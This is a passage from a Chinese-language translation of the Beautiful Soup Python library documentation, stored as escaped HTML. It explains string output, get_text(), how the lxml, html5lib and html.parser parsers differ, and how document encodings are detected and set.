href=&amp;quot;http://example.com/&amp;quot;&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  I linked to&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;i&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#   example.com&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#  &amp;lt;/i&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;压缩输出&quot;&gt;&lt;a href=&quot;#压缩输出&quot; class=&quot;headerlink&quot; title=&quot;压缩输出&quot;&gt;&lt;/a&gt;压缩输出&lt;/h2&gt;&lt;p&gt;如果只想得到结果字符串,不重视格式,那么可以对一个 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象或 &lt;code&gt;Tag&lt;/code&gt; 对象使用Python的 &lt;code&gt;unicode()&lt;/code&gt; 或 &lt;code&gt;str()&lt;/code&gt; 方法:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;str(soup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;unicode(soup.a)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;I linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;code&gt;str()&lt;/code&gt; 方法返回UTF-8编码的字符串,可以指定 &lt;a href=&quot;#id51&quot;&gt;编码&lt;/a&gt; 的设置.&lt;/p&gt;
&lt;p&gt;还可以调用 &lt;code&gt;encode()&lt;/code&gt; 方法获得字节码或调用 &lt;code&gt;decode()&lt;/code&gt; 方法获得Unicode.&lt;/p&gt;
&lt;h2 id=&quot;输出格式&quot;&gt;&lt;a href=&quot;#输出格式&quot; class=&quot;headerlink&quot; title=&quot;输出格式&quot;&gt;&lt;/a&gt;输出格式&lt;/h2&gt;&lt;p&gt;Beautiful Soup输出是会将HTML中的特殊字符转换成Unicode,比如“&amp;lquot;”:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(&amp;quot;&amp;amp;ldquo;Dammit!&amp;amp;rdquo; he said.&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;unicode(soup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;\u201cDammit!\u201d he said.&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;如果将文档转换成字符串,Unicode编码会被编码成UTF-8.这样就无法正确显示HTML特殊字符了:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;str(soup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;apos;&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;\xe2\x80\x9cDammit!\xe2\x80\x9d he said.&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h2 id=&quot;get-text&quot;&gt;&lt;a href=&quot;#get-text&quot; class=&quot;headerlink&quot; title=&quot;get_text()&quot;&gt;&lt;/a&gt;get_text()&lt;/h2&gt;&lt;p&gt;如果只想得到tag中包含的文本内容,那么可以嗲用 &lt;code&gt;get_text()&lt;/code&gt; 方法,这个方法获取到tag中包含的所有文版内容包括子孙tag中的内容,并将结果作为Unicode字符串返回:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;apos;&amp;lt;a href=&amp;quot;http://example.com/&amp;quot;&amp;gt;\nI linked to &amp;lt;i&amp;gt;example.com&amp;lt;/i&amp;gt;\n&amp;lt;/a&amp;gt;&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.get_text()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;u&amp;apos;\nI linked to example.com\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.i.get_text()&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;u&amp;apos;example.com&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;可以通过参数指定tag的文本内容的分隔符:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# soup.get_text(&amp;quot;|&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;u&amp;apos;\nI linked to |example.com|\n&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;还可以去除获得文本内容的前后空白:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;# soup.get_text(&amp;quot;|&amp;quot;, strip=True)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;u&amp;apos;I linked to|example.com&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;或者使用 &lt;a href=&quot;#strings-stripped-strings&quot;&gt;.stripped_strings&lt;/a&gt; 生成器,获得文本列表后手动处理列表:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;[text for text in soup.stripped_strings]&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# [u&amp;apos;I linked to&amp;apos;, u&amp;apos;example.com&amp;apos;]&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;h1 id=&quot;指定文档解析器&quot;&gt;&lt;a href=&quot;#指定文档解析器&quot; class=&quot;headerlink&quot; title=&quot;指定文档解析器&quot;&gt;&lt;/a&gt;指定文档解析器&lt;/h1&gt;&lt;p&gt;如果仅是想要解析HTML文档,只要用文档创建 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象就可以了.Beautiful Soup会自动选择一个解析器来解析文档.但是还可以通过参数指定使用那种解析器来解析当前文档.&lt;/p&gt;
&lt;p&gt;&lt;code&gt;BeautifulSoup&lt;/code&gt; 第一个参数应该是要被解析的文档字符串或是文件句柄,第二个参数用来标识怎样解析文档.如果第二个参数为空,那么Beautiful Soup根据当前系统安装的库自动选择解析器,解析器的优先数序: lxml, html5lib, Python标准库.在下面两种条件下解析器优先顺序会变化:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;要解析的文档是什么类型: 目前支持, “html”, “xml”, 和 “html5”&lt;/li&gt;
&lt;li&gt;指定使用哪种解析器: 目前支持, “lxml”, “html5lib”, 和 “html.parser”&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;a href=&quot;#id9&quot;&gt;安装解析器&lt;/a&gt; 章节介绍了可以使用哪种解析器,以及如何安装.&lt;/p&gt;
&lt;p&gt;如果指定的解析器没有安装,Beautiful Soup会自动选择其它方案.目前只有 lxml 解析器支持XML文档的解析,在没有安装lxml库的情况下,创建 &lt;code&gt;beautifulsoup&lt;/code&gt; 对象时无论是否指定使用lxml,都无法得到解析后的对象&lt;/p&gt;
&lt;h2 id=&quot;解析器之间的区别&quot;&gt;&lt;a href=&quot;#解析器之间的区别&quot; class=&quot;headerlink&quot; title=&quot;解析器之间的区别&quot;&gt;&lt;/a&gt;解析器之间的区别&lt;/h2&gt;&lt;p&gt;Beautiful Soup为不同的解析器提供了相同的接口,但解析器本身时有区别的.同一篇文档被不同的解析器解析后可能会生成不同结构的树型文档.区别最大的是HTML解析器和XML解析器,看下面片段被解析成HTML结构:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BeautifulSoup(&amp;quot;&amp;lt;a&amp;gt;&amp;lt;b /&amp;gt;&amp;lt;/a&amp;gt;&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;a&amp;gt;&amp;lt;b&amp;gt;&amp;lt;/b&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;因为空标签&lt;code&gt;&amp;lt;b /&amp;gt;&lt;/code&gt;不符合HTML标准,所以解析器把它解析成&lt;code&gt;&amp;lt;b&amp;gt;&amp;lt;/b&amp;gt;&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;同样的文档使用XML解析如下(解析XML需要安装lxml库).注意,空标签&lt;code&gt;&amp;lt;b /&amp;gt;&lt;/code&gt;依然被保留,并且文档前添加了XML头,而不是被包含在&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;标签内:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BeautifulSoup(&amp;quot;&amp;lt;a&amp;gt;&amp;lt;b /&amp;gt;&amp;lt;/a&amp;gt;&amp;quot;, &amp;quot;xml&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;?xml version=&amp;quot;1.0&amp;quot; encoding=&amp;quot;utf-8&amp;quot;?&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a&amp;gt;&amp;lt;b/&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;HTML解析器之间也有区别,如果被解析的HTML文档是标准格式,那么解析器之间没有任何差别,只是解析速度不同,结果都会返回正确的文档树.&lt;/p&gt;
&lt;p&gt;但是如果被解析文档不是标准格式,那么不同的解析器返回结果可能不同.下面例子中,使用lxml解析错误格式的文档,结果&lt;code&gt;&amp;lt;/p&amp;gt;&lt;/code&gt;标签被直接忽略掉了:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BeautifulSoup(&amp;quot;&amp;lt;a&amp;gt;&amp;lt;/p&amp;gt;&amp;quot;, &amp;quot;lxml&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&amp;lt;body&amp;gt;&amp;lt;a&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;使用html5lib库解析相同文档会得到不同的结果:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BeautifulSoup(&amp;quot;&amp;lt;a&amp;gt;&amp;lt;/p&amp;gt;&amp;quot;, &amp;quot;html5lib&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;a&amp;gt;&amp;lt;p&amp;gt;&amp;lt;/p&amp;gt;&amp;lt;/a&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;html5lib库没有忽略掉&lt;code&gt;&amp;lt;/p&amp;gt;&lt;/code&gt;标签,而是自动补全了标签,还给文档树添加了&lt;code&gt;&amp;lt;head&amp;gt;&lt;/code&gt;标签.&lt;/p&gt;
&lt;p&gt;使用pyhton内置库解析结果如下:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;BeautifulSoup(&amp;quot;&amp;lt;a&amp;gt;&amp;lt;/p&amp;gt;&amp;quot;, &amp;quot;html.parser&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;a&amp;gt;&amp;lt;/a&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;与lxml [7] 库类似的,Python内置库忽略掉了&lt;code&gt;&amp;lt;/p&amp;gt;&lt;/code&gt;标签,与html5lib库不同的是标准库没有尝试创建符合标准的文档格式或将文档片段包含在&lt;code&gt;&amp;lt;body&amp;gt;&lt;/code&gt;标签内,与lxml不同的是标准库甚至连&lt;code&gt;&amp;lt;html&amp;gt;&lt;/code&gt;标签都没有尝试去添加.&lt;/p&gt;
&lt;p&gt;因为文档片段“&lt;code&gt;&amp;lt;a&amp;gt;&amp;lt;/p&amp;gt;&lt;/code&gt;”是错误格式,所以以上解析方式都能算作”正确”,html5lib库使用的是HTML5的部分标准,所以最接近”正确”.不过所有解析器的结构都能够被认为是”正常”的.&lt;/p&gt;
&lt;p&gt;不同的解析器可能影响代码执行结果,如果在分发给别人的代码中使用了 &lt;code&gt;BeautifulSoup&lt;/code&gt; ,那么最好注明使用了哪种解析器,以减少不必要的麻烦.&lt;/p&gt;
&lt;h1 id=&quot;编码&quot;&gt;&lt;a href=&quot;#编码&quot; class=&quot;headerlink&quot; title=&quot;编码&quot;&gt;&lt;/a&gt;编码&lt;/h1&gt;&lt;p&gt;任何HTML或XML文档都有自己的编码方式,比如ASCII 或 UTF-8,但是使用Beautiful Soup解析后,文档都被转换成了Unicode:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = &amp;quot;&amp;lt;h1&amp;gt;Sacr\xc3\xa9 bleu!&amp;lt;/h1&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.h1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# &amp;lt;h1&amp;gt;Sacré bleu!&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.h1.string&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;# u&amp;apos;Sacr\xe9 bleu!&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;这不是魔术(但很神奇),Beautiful Soup用了 &lt;a href=&quot;#unicode-dammit&quot;&gt;编码自动检测&lt;/a&gt; 子库来识别当前文档编码并转换成Unicode编码. &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象的 &lt;code&gt;.original_encoding&lt;/code&gt; 属性记录了自动识别编码的结果:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup.original_encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;apos;utf-8&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;&lt;a href=&quot;#unicode-dammit&quot;&gt;编码自动检测&lt;/a&gt; 功能大部分时候都能猜对编码格式,但有时候也会出错.有时候即使猜测正确,也是在逐个字节的遍历整个文档后才猜对的,这样很慢.如果预先知道文档编码,可以设置编码参数来减少自动检查编码出错的概率并且提高文档解析速度.在创建 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象的时候设置 &lt;code&gt;from_encoding&lt;/code&gt; 参数.&lt;/p&gt;
&lt;p&gt;下面一段文档用了ISO-8859-8编码方式,这段文档太短,结果Beautiful Soup以为文档是用ISO-8859-7编码:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;markup = b&amp;quot;&amp;lt;h1&amp;gt;\xed\xe5\xec\xf9&amp;lt;/h1&amp;gt;&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.h1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;h1&amp;gt;νεμω&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.original_encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;apos;ISO-8859-7&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;通过传入 &lt;code&gt;from_encoding&lt;/code&gt; 参数来指定编码方式:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;soup = BeautifulSoup(markup, from_encoding=&amp;quot;iso-8859-8&amp;quot;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.h1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;lt;h1&amp;gt;םולש&amp;lt;/h1&amp;gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;soup.original_encoding&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;apos;iso8859-8&amp;apos;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;少数情况下(通常是UTF-8编码的文档中包含了其它编码格式的文件),想获得正确的Unicode编码就不得不将文档中少数特殊编码字符替换成特殊Unicode编码,“REPLACEMENT CHARACTER” (U+FFFD, �) [9] . 如果Beautifu Soup猜测文档编码时作了特殊字符的替换,那么Beautiful Soup会把 &lt;code&gt;UnicodeDammit&lt;/code&gt; 或 &lt;code&gt;BeautifulSoup&lt;/code&gt; 对象的 &lt;code&gt;.contains_replacement_characters&lt;/code&gt; 属性标记为 &lt;code&gt;True&lt;/code&gt; .这样就可以知道当前文档进行Unicode编码后丢失了一部分特殊内容字符.如果文档中包含�而 &lt;code&gt;.contains_replacement_characters&lt;/code&gt; 属性是 &lt;code&gt;False&lt;/code&gt; ,则表示�就是文档中原来的字符,不是转码失败.&lt;/p&gt;
&lt;h2 id=&quot;输出编码&quot;&gt;&lt;a href=&quot;#输出编码&quot; class=&quot;headerlink&quot; title=&quot;输出编码&quot;&gt;&lt;/a&gt;输出编码&lt;/h2&gt;&lt;p&gt;通过Beautiful Soup输出文档时,不管输入文档是什么编码方式,输出编码均为UTF-8编码,下面例子输入文档是Latin-1编码:&lt;/p&gt;
&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span 